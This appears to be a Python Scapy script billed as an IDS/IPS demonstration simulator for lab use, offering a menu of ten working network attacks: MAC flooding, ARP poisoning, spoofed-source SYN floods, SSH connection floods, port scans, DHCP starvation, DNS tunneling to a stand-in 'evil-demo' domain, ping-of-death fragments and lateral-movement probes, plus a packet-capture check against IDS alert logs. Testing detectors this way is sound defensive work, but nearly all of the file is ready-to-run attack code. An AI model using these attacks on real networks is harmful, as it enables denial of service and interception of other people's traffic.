#!/usr/bin/env python3
# IDS/IPS Demo Attack Simulator - topology-aware (host / gateway mode)
# Sends REAL packets for detection testing. Authorized demo/lab use only.
# This script ONLY transmits. It performs NO blocking.

import os, sys, time, random, base64, socket, re, subprocess, argparse, ipaddress, signal, tempfile

if os.geteuid() != 0:
    print("[!] Run as root: sudo python3 ids_demo_attacks.py")
    sys.exit(1)

try:
    from scapy.all import (
        Ether, ARP, IP, TCP, UDP, ICMP, Raw, BOOTP, DHCP, DNS, DNSQR,
        send, sendp, sr1, fragment, RandMAC, RandIP, RandShort,
        get_if_hwaddr, getmacbyip, get_if_list, conf, rdpcap
    )
except ImportError:
    print("[!] Scapy missing. Install: sudo apt install python3-scapy  (or pip install scapy)")
    sys.exit(1)

conf.verb = 0

CFG = {
    "mode": None, "iface": None, "wan_iface": None, "lan_iface": None,
    "my_ip": None, "my_mac": None, "gateway_ip": None, "lan_net": None,
    "verify": False, "ids_log": None,
}

# ------------------------- helpers -------------------------
def ask(prompt, default=None):
    d = f" [{default}]" if default not in (None, "") else ""
    val = input(f"{prompt}{d}: ").strip()
    return val if val else (default if default is not None else val)

def mac_to_bytes(mac):
    return bytes.fromhex(mac.replace(":", "").replace("-", ""))

def list_ipv4():
    res = {}
    try:
        out = subprocess.run(["ip", "-o", "-4", "addr", "show"],
                             capture_output=True, text=True).stdout
    except FileNotFoundError:
        return res
    for line in out.splitlines():
        m = re.match(r"\d+:\s+(\S+)\s+inet\s+(\d+\.\d+\.\d+\.\d+)/(\d+)", line)
        if m:
            res.setdefault(m.group(1), (m.group(2), int(m.group(3))))
    return res

def default_route():
    try:
        out = subprocess.run(["ip", "route", "show", "default"],
                             capture_output=True, text=True).stdout
    except FileNotFoundError:
        return None, None
    m = re.search(r"default via (\S+) dev (\S+)", out)
    return (m.group(1), m.group(2)) if m else (None, None)

def net_of(ip, prefix):
    return ipaddress.ip_network(f"{ip}/{prefix}", strict=False)

def ids_log_count(path):
    if not path:
        return None
    try:
        with open(path) as f:
            return sum(1 for _ in f)
    except Exception:
        return None

# ----------------- verify wrapper (capture + report) -----------------
def run_attack(fn, label, bpf="ip"):
    """Run an attack. If verify is on, capture packets and report counts."""
    if not CFG["verify"]:
        fn()
        return

    print(f"\n[VERIFY] capturing on {CFG['iface']}  filter='{bpf or 'all'}'")
    tmp = tempfile.NamedTemporaryFile(suffix=".pcap", delete=False)
    tmp.close()

    cmd = ["tcpdump", "-i", CFG["iface"], "-n", "-U", "-w", tmp.name]
    if bpf:
        cmd += bpf.split()
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(0.6)

    before = ids_log_count(CFG["ids_log"]) if CFG["ids_log"] else None
    t0 = time.time()
    err = None
    try:
        fn()
    except Exception as e:
        err = e
    dur = time.time() - t0
    time.sleep(0.4)

    proc.send_signal(signal.SIGINT)
    try:
        proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        proc.terminate()

    n = 0
    try:
        n = len(rdpcap(tmp.name))
    except Exception:
        pass
    try:
        os.unlink(tmp.name)
    except Exception:
        pass

    print("\n================ VERIFY RESULT ================")
    print(f" attack       : {label}")
    print(f" filter       : {bpf or 'all'}")
    print(f" duration     : {dur:.2f}s")
    print(f" packets seen : {n}")
    print(f" script       : {'OK - packets on the wire' if n > 0 else 'NO PACKETS - check iface/filter/sudo'}")

    if CFG["ids_log"]:
        after = ids_log_count(CFG["ids_log"])
        if before is not None and after is not None:
            delta = after - before
            print(f" IDS log      : {CFG['ids_log']}")
            print(f" new alerts   : {delta}")
            print(f" detector     : {'IDS ALERTED' if delta > 0 else 'no new IDS lines'}")
    print("==============================================")
    if err:
        raise err

# ------------------------ topology setup -------------------------
def setup_host_mode(args):
    ipv4 = list_ipv4()
    gw, rt_iface = default_route()
    iface = args.iface or rt_iface
    if not iface:
        print("Interfaces:", ", ".join(ipv4.keys()) or ", ".join(get_if_list()))
        iface = ask("Interface connected to the network", get_if_list()[0])

    ip, prefix = ipv4.get(iface, ("0.0.0.0", 24))
    net = net_of(ip, prefix)
    gateway = args.gw or gw or str(next(net.hosts()))

    print("\n[HOST MODE detected]")
    print(f"   iface   : {iface}")
    print(f"   my IP   : {ip}/{prefix}")
    print(f"   subnet  : {net}")
    print(f"   gateway : {gateway}")

    if ask("Use these values? (y/n)", "y").lower().startswith("n"):
        iface = ask("Interface", iface)
        ip = ask("My IP", ip)
        prefix = int(ask("Prefix", str(prefix)))
        net = net_of(ip, prefix)
        gateway = ask("Gateway IP", gateway)

    CFG.update(mode="host", iface=iface, wan_iface=None, lan_iface=None,
               my_ip=ip, my_mac=get_if_hwaddr(iface), gateway_ip=gateway, lan_net=net)
    print("[*] Host mode ready (monitor / local blocking only).\n")

def setup_gateway_mode(args):
    ipv4 = list_ipv4()
    gw, rt_iface = default_route()
    wan = args.wan or rt_iface

    lan_candidates = [i for i, (ip, _p) in ipv4.items()
                      if i not in ("lo", wan) and ipaddress.ip_address(ip).is_private]
    if args.lan:
        lan = args.lan
    elif lan_candidates:
        lan = lan_candidates[0]
    else:
        lan = ask("LAN (AP) interface (e.g. wlan0)", "wlan0")

    l_ip, l_prefix = ipv4.get(lan, ("10.42.0.1", 24))
    lan_net = net_of(l_ip, l_prefix)
    my_mac = get_if_hwaddr(lan) if lan in get_if_list() else "00:00:00:00:00:00"

    print("\n[GATEWAY MODE detected]")
    print(f"   WAN (tether): {wan}")
    print(f"   LAN (AP)    : {lan}")
    print(f"   gateway     : {l_ip}/{l_prefix}")
    print(f"   LAN subnet  : {lan_net}")

    if ask("Use these values? (y/n)", "y").lower().startswith("n"):
        wan = ask("WAN interface", wan)
        lan = ask("LAN (AP) interface", lan)
        l_ip = ask("Gateway/LAN IP", l_ip)
        l_prefix = int(ask("LAN prefix", str(l_prefix)))
        lan_net = net_of(l_ip, l_prefix)
        my_mac = get_if_hwaddr(lan)

    CFG.update(mode="gateway", iface=lan, wan_iface=wan, lan_iface=lan,
               my_ip=l_ip, my_mac=my_mac, gateway_ip=l_ip, lan_net=lan_net)
    print("[*] Gateway mode ready (on-path; attacks run inside your own LAN).\n")

def setup_topology(args):
    print("""
===================== TOPOLOGY MODE =====================
 1) HOST MODE    - laptop on an existing network (monitor only)
 2) GATEWAY MODE - laptop = AP + router over phone USB tethering
========================================================""")
    if ask("Select mode", "1") == "2":
        setup_gateway_mode(args)
    else:
        setup_host_mode(args)

def default_target():
    if CFG["mode"] == "gateway":
        for h in CFG["lan_net"].hosts():
            if str(h) != CFG["my_ip"]:
                return str(h)
        return str(next(CFG["lan_net"].hosts()))
    return CFG["gateway_ip"]

def banner(name):
    print(f"\n--- {name} ---")
    print(f"    mode={CFG['mode']} iface={CFG['iface']} seg={CFG['lan_net']} src={CFG['my_ip']}")

# =========================== ATTACKS =============================
def mac_flood(count, delay):
    banner("MAC Flooding (CAM table overflow)")
    iface, sent = CFG["iface"], 0
    while count == 0 or sent < count:
        sendp(Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") /
              IP(src=RandIP(), dst=RandIP()) / UDP(sport=RandShort(), dport=RandShort()) /
              Raw(load=os.urandom(64)), iface=iface, verbose=0)
        sent += 1
        if sent % 500 == 0:
            print(f"    {sent} frames")
        if delay:
            time.sleep(delay)
    print(f"[+] Done: {sent} frames.")

def arp_spoof(victim_ip, spoof_ip, count, delay):
    banner("ARP Spoofing (cache poisoning)")
    iface, attacker = CFG["iface"], CFG["my_mac"]
    victim_mac = getmacbyip(victim_ip) or "ff:ff:ff:ff:ff:ff"
    print(f"    claiming {spoof_ip} at {attacker} -> victim {victim_ip}")
    for i in range(count):
        sendp(Ether(dst=victim_mac, src=attacker) /
              ARP(op=2, psrc=spoof_ip, pdst=victim_ip, hwsrc=attacker, hwdst=victim_mac),
              iface=iface, verbose=0)
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src=attacker) /
              ARP(op=2, psrc=spoof_ip, pdst=spoof_ip, hwsrc=attacker, hwdst="ff:ff:ff:ff:ff:ff"),
              iface=iface, verbose=0)
        print(f"    poison #{i+1}")
        time.sleep(delay)
    print("[+] Done ARP spoofing.")

def lateral_movement(hosts, ports, delay):
    banner("Abnormal Lateral Movement")
    for host in hosts:
        for port in ports:
            send(IP(dst=host) / TCP(sport=RandShort(), dport=port, flags="S"), verbose=0)
            print(f"    {host}:{port}")
            time.sleep(delay)
    print("[+] Done lateral movement.")

def syn_flood(target, dport, count, delay):
    banner(f"TCP SYN Flood -> {target}:{dport}")
    pkts = [IP(src=RandIP(), dst=target) /
            TCP(sport=RandShort(), dport=dport, flags="S", seq=random.randint(0, 2**32 - 1))
            for _ in range(count)]
    send(pkts, verbose=0)
    print(f"[+] Done: {count} SYNs sent in one batch.")

def ssh_brute(target, port, attempts, delay):
    banner(f"SSH Brute Force -> {target}:{port}")
    ok = 0
    for i in range(attempts):
        try:
            s = socket.socket(); s.settimeout(1)
            s.connect((target, port))
            try:
                s.sendall(b"SSH-2.0-OpenSSH_8.9_demo\r\n"); s.recv(256)
            except Exception:
                pass
            s.close(); ok += 1
        except Exception:
            pass
        if (i + 1) % 10 == 0:
            print(f"    attempt #{i+1}")
        time.sleep(delay)
    print(f"[+] Done: {ok}/{attempts} sessions.")

def port_scan(target, start, end, delay):
    banner(f"TCP SYN port scan {target} {start}-{end}")
    opened = []
    for p in range(start, end + 1):
        ans = sr1(IP(dst=target) / TCP(sport=RandShort(), dport=p, flags="S"),
                  timeout=0.3, verbose=0)
        if ans and ans.haslayer(TCP) and ans[TCP].flags == 0x12:
            opened.append(p); print(f"    OPEN {p}")
            send(IP(dst=target) / TCP(sport=ans[TCP].dport, dport=p,
                 flags="R", seq=ans[TCP].ack), verbose=0)
        if delay:
            time.sleep(delay)
    print(f"[+] Done. Open: {opened}")

def dhcp_starvation(count, delay):
    banner("DHCP Starvation")
    iface = CFG["iface"]
    for i in range(count):
        mac = RandMAC()
        sendp(Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
              IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) /
              BOOTP(chaddr=mac_to_bytes(mac), xid=random.randint(1, 2**32 - 1), flags=0x8000) /
              DHCP(options=[("message-type", "discover"), "end"]), iface=iface, verbose=0)
        if (i + 1) % 20 == 0:
            print(f"    {i+1} DISCOVERs")
        time.sleep(delay)
    print("[+] Done DHCP starvation.")

def dns_tunnel(dns_server, domain, count, delay):
    banner(f"DNS Tunneling -> {dns_server} zone={domain}")
    for i in range(count):
        enc = base64.b32encode(os.urandom(60)).decode().strip("=").lower()
        qname = f"{enc}.{domain}"
        send(IP(dst=dns_server) / UDP(sport=RandShort(), dport=53) /
             DNS(rd=1, qd=DNSQR(qname=qname, qtype="TXT")), verbose=0)
        if (i + 1) % 20 == 0:
            print(f"    {i+1} queries (label {len(qname)})")
        time.sleep(delay)
    print("[+] Done DNS tunneling.")

def ping_of_death(target, count, delay):
    banner(f"Ping of Death -> {target}")
    for i in range(count):
        frags = fragment(IP(dst=target) / ICMP() / Raw(load="A" * 70000), fragsize=1480)
        send(frags, verbose=0)
        print(f"    PoD #{i+1}: {len(frags)} fragments")
        time.sleep(delay)
    print("[+] Done Ping of Death.")

def ping_sweep(start, end, delay):
    banner(f"ICMP Ping Sweep {CFG['lan_net']}")
    live = []
    for i in range(start, end + 1):
        ip = str(CFG["lan_net"].network_address + i)
        if sr1(IP(dst=ip) / ICMP(), timeout=0.4, verbose=0):
            live.append(ip); print(f"    ALIVE {ip}")
        if delay:
            time.sleep(delay)
    print(f"[+] Done. Live: {live}")

# =========================== MENU ================================
def menu():
    seg = CFG["lan_net"]
    host_start = max(1, int(str(seg.network_address).split('.')[-1]) + 1)
    host_end = min(254, int(str(seg.broadcast_address).split('.')[-1]) - 1)
    tgt = default_target()
    vflag = "ON" if CFG["verify"] else "OFF"

    print(f"""
============ IDS/IPS DEMO  [{CFG['mode'].upper()} MODE] ============
 iface={CFG['iface']} my_ip={CFG['my_ip']} seg={seg}
 verify={vflag} ids_log={CFG['ids_log'] or '-'}
 1) MAC Flooding              6) Network Port Scanning
 2) ARP Spoofing              7) DHCP Starvation
 3) Abnormal Lateral Movement 8) DNS Tunneling
 4) TCP SYN Flood             9) Ping of Death
 5) SSH Brute Force          10) ICMP Ping Sweep
 t) Topology  v) Toggle verify  l) Set IDS log  0) Exit
=======================================================""")
    ch = ask("Select attack", "0")

    if ch == "1":
        run_attack(lambda: mac_flood(int(ask("Frames (0=inf)", "50000")), float(ask("Delay s", "0"))),
                   "MAC Flooding", "ether dst ff:ff:ff:ff:ff:ff")
    elif ch == "2":
        victim = ask("Victim IP", tgt); spoof = ask("Spoof IP", CFG["gateway_ip"])
        cnt = int(ask("Count", "30")); dly = float(ask("Delay s", "1"))
        run_attack(lambda: arp_spoof(victim, spoof, cnt, dly), "ARP Spoofing", "arp")
    elif ch == "3":
        hosts = ask("Hosts (comma)", ",".join([str(seg.network_address + i) for i in range(10, 13)])).split(",")
        ports = [int(p) for p in ask("Ports (comma)", "22,135,139,445,3389,5985").split(",")]
        dly = float(ask("Delay s", "0.2"))
        run_attack(lambda: lateral_movement([h.strip() for h in hosts], ports, dly),
                   "Abnormal Lateral Movement", "tcp[tcpflags] & tcp-syn != 0")
    elif ch == "4":
        t = ask("Target IP", tgt); dp = int(ask("Port", "80"))
        cnt = int(ask("SYN count", "5000")); dly = float(ask("Delay s", "0"))
        run_attack(lambda: syn_flood(t, dp, cnt, dly), "TCP SYN Flood", "tcp[tcpflags] & tcp-syn != 0")
    elif ch == "5":
        t = ask("Target IP", tgt); dp = int(ask("SSH port", "22"))
        at = int(ask("Attempts", "50")); dly = float(ask("Delay s", "0.3"))
        run_attack(lambda: ssh_brute(t, dp, at, dly), "SSH Brute Force", f"tcp port {dp}")
    elif ch == "6":
        t = ask("Target IP", tgt); s = int(ask("Start port", "1"))
        e = int(ask("End port", "1024")); dly = float(ask("Delay s", "0"))
        run_attack(lambda: port_scan(t, s, e, dly), "Network Port Scanning", "tcp[tcpflags] & tcp-syn != 0")
    elif ch == "7":
        cnt = int(ask("DISCOVER count", "300")); dly = float(ask("Delay s", "0.1"))
        run_attack(lambda: dhcp_starvation(cnt, dly), "DHCP Starvation", "udp port 67 or udp port 68")
    elif ch == "8":
        srv = ask("DNS server IP", CFG["gateway_ip"]); dom = ask("Tunnel domain", "tunnel.evil-demo.com")
        cnt = int(ask("Query count", "200")); dly = float(ask("Delay s", "0.1"))
        run_attack(lambda: dns_tunnel(srv, dom, cnt, dly), "DNS Tunneling", "udp port 53")
    elif ch == "9":
        t = ask("Target IP", tgt); cnt = int(ask("Count", "10")); dly = float(ask("Delay s", "1"))
        run_attack(lambda: ping_of_death(t, cnt, dly), "Ping of Death", "icmp")
    elif ch == "10":
        s = int(ask("Start host", str(host_start))); e = int(ask("End host", str(host_end)))
        dly = float(ask("Delay s", "0"))
        run_attack(lambda: ping_sweep(s, e, dly), "ICMP Ping Sweep", "icmp")
    elif ch == "t":
        print(f"\n    mode={CFG['mode']} WAN={CFG['wan_iface']} LAN={CFG['iface']}")
        print(f"    my={CFG['my_ip']} / {CFG['my_mac']} gw={CFG['gateway_ip']} seg={CFG['lan_net']}\n")
    elif ch == "v":
        CFG["verify"] = not CFG["verify"]
        print(f"[*] verify mode = {'ON' if CFG['verify'] else 'OFF'}")
    elif ch == "l":
        CFG["ids_log"] = ask("IDS alert log path (e.g. /var/log/suricata/fast.log)", CFG["ids_log"] or "")
    elif ch == "0":
        return False
    else:
        print("[!] Invalid choice.")
    if ch not in ("t", "v"):
        input("\nPress Enter to return to the menu...")
    return True

def main():
    ap = argparse.ArgumentParser(description="Topology-aware IDS/IPS demo simulator")
    ap.add_argument("--iface", help="host mode: network iface")
    ap.add_argument("--lan", help="gateway mode: LAN/AP iface")
    ap.add_argument("--wan", help="gateway mode: WAN iface (USB tether)")
    ap.add_argument("--gw", help="host mode: gateway IP")
    ap.add_argument("--verify", action="store_true", help="capture + report packet counts per attack")
    ap.add_argument("--ids-log", help="path to IDS alert log to count new alerts")
    args = ap.parse_args()

    CFG["verify"] = args.verify
    CFG["ids_log"] = args.ids_log

    setup_topology(args)
    while menu():
        pass
    print("[*] Bye.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user.")